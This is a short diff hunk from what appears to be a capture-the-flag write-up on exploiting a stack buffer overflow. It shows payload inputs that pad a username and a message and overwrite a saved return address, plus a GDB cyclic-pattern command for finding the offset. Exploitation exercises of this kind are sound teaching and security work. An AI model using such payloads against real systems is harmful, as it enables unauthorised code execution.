@@ -70,7 +70,7 @@ The program first asks for a username. We input `'a'*40 + '\xff' + '\n'`. This f
 Then the program asks for the message. We input `'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n'`.
 
 To find the offset (200), we use a cyclic pattern in GDB:
-- shell python -c 'import sys; u="a"*40+"\xd4\n"; m="Aa0Aa1...Aj9"; sys.stdout.write(u+m)' > /tmp/inp
+- `shell python -c 'import sys; u="a"*40+"\xff\n"; m="Aa0Aa1...Aj9"; sys.stdout.write(u+m)' > /tmp/inp`
 - run < /tmp/inp
 
 The program segfaults in handle_msg because the saved return address is corrupted.
